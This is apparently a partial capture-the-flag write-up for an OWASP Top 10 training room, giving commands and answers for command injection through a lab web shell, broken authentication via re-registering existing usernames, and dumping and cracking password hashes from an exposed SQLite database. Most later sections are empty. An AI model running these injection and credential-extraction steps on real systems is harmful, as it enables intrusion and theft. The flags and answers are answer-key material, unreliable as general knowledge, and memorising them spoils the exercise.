# [Severity 1] Command Injection Practical

### What strange text file is in the website root directory?
```
[in web]
ls
[in cmd]
# curl -X GET http://10.10.235.224/evilshell.php?commandString=ls
or
# curl -X GET --data "commandString=ls" -G http://10.10.235.224/evilshell.php
```
> *Answer:* drpepper.txt

### How many non-root/non-service/non-daemon users are there?
```
cat /etc/passwd
```
> *Answer:* 0

### What user is this app running as?
```
whoami
```
> *Answer:* www-data

### What is the user's shell set as?
```
cat /etc/passwd
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```
> *Answer:* /usr/sbin/nologin

### What version of Ubuntu is running?
```
cat /etc/os-release
or
lsb_release -a
or
hostnamectl
```
> *Answer:* 18.04.4

### Print out the MOTD.  What favorite beverage is shown?
```
cat /etc/update-motd.d/00-header
...
DR PEPPER MAKES THE WORLD TASTE BETTER!
```
> *Answer:* Dr Pepper


<br><br>
# [Severity 2] Broken Authentication Practical

### What is the flag that you found in darren's account?
```
register a user " darren"
```
> *Answer:* fe86079416a21a3c99937fea8874b667

### What is the flag that you found in arthur's account?
```
register a user " arthur"
```
> *Answer:* d9ac0f7db4fda460ac3edeb75d75e16e


<br><br>
# [Severity 3] Sensitive Data Exposure (Challenge)

### What is the name of the mentioned directory?
```
# dirsearch -u http://10.10.68.46/
...
[03:51:53] 301 -  311B  - /assets  ->  http://10.10.68.46/assets/
[03:51:53] 200 -    2KB - /assets/
...
```
> *Answer:* /assets

### Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
> *Answer:* webapp.db

### Use the supporting material to access the sensitive data. What is the password hash of the admin user?
```
# sqlite3 webapp.db
SQLite version 3.36.0 2021-06-18 18:36:39
Enter ".help" for usage hints.
sqlite> .tables
sessions  users   
sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
sqlite> SELECT * FROM users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
sqlite> .quit
```
> *Answer:* 6eea9b7ef19179a06954edd0f6c05ceb

### What is the admin's plaintext password?
Use <a href="https://crackstation.net/" target="_blank">Crackstation</a> or <a href="https://www.cmd5.org/" target="_blank">Cmd5</a>
> *Answer:* qwertyuiop

### Login as the admin. What is the flag?
> *Answer:* THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}


<br><br>
# [Severity 4 XML External Entity - eXtensible Markup Language

### Full form of XML
```
```
> *Answer:* 

### Is it compulsory to have XML prolog in XML documents?
```
```
> *Answer:* 

### Can we validate XML documents against a schema?
```
```
> *Answer:* 

### How can we specify XML version and encoding in XML document?
```
```
> *Answer:* 


<br><br>
# [Severity 4] XML External Entity - DTD

### How do you define a new ELEMENT?
```
```
> *Answer:* 

### How do you define a ROOT element?
```
```
> *Answer:* 

### How do you define a new ENTITY?
```
```
> *Answer:* 


<br><br>
# [Severity 4] XML External Entity - Exploiting

### What is the name of the user in /etc/passwd
```
```
> *Answer:* 

### Where is falcon's SSH key located?
```
```
> *Answer:* 

### What are the first 18 characters for falcon's private key
```
```
> *Answer:* 


<br><br>
# [Severity 5] Broken Access Control (IDOR Challenge)

### Look at other users notes. What is the flag?
```
```
> *Answer:* 


<br><br>
# [Severity 6] Security Misconfiguration

### Hack into the webapp, and find the flag!
```
```
> *Answer:* 


<br><br>
# [Severity 7] Cross-site Scripting

### Navigate to http://MACHINE_IP/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".
```
```
> *Answer:* 

### On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
```
```
> *Answer:* 

### Now navigate to http://MACHINE_IP/ in your browser and click on the "Stored XSS" tab on the navbar; make an account. Then add a comment and see if you can insert some of your own HTML.
```
```
> *Answer:* 

### On the same page, create an alert popup box appear on the page with your document cookies.
```
```
> *Answer:* 

### Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
```
```
> *Answer:* 


<br><br>
# [Severity 8] Insecure Deserialization

### Who developed the Tomcat application?
```
```
> *Answer:* 

### What type of attack that crashes services can be performed with insecure deserialization?
```
```
> *Answer:* 


<br><br>
# [Severity 8] Insecure Deserialization - Objects

### Select the correct term of the statement:
> *Answer:* B) A Behaviour


<br><br>
# [Severity 8] Insecure Deserialization - Deserialization

### What is the name of the base-2 formatting that data is sent across a network as?
```
```
> *Answer:* 


<br><br>
# [Severity 8] Insecure Deserialization - Cookies

### If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?
> *Answer:* webapp.com/login

### What is the acronym for the web technology that Secure cookies work over?
> *Answer:* https


<br><br>
# [Severity 8] Insecure Deserialization - Cookies Practical

### 1st flag (cookie value)
```
```
> *Answer:* 

### 2nd flag (admin dashboard)
```
```
> *Answer:* 


<br><br>
# [Severity 8] Insecure Deserialization - Code Execution

### flag.txt
```
```
> *Answer:* 


<br><br>
# [Severity 9] Components With Known Vulnerabilities - Lab

### How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)
```
```
> *Answer:* 


<br><br>
# [Severity 10] Insufficient Logging and Monitoring

### What IP address is the attacker using?
```
```
> *Answer:* 

### What kind of attack is being carried out?
```
```
> *Answer:* 

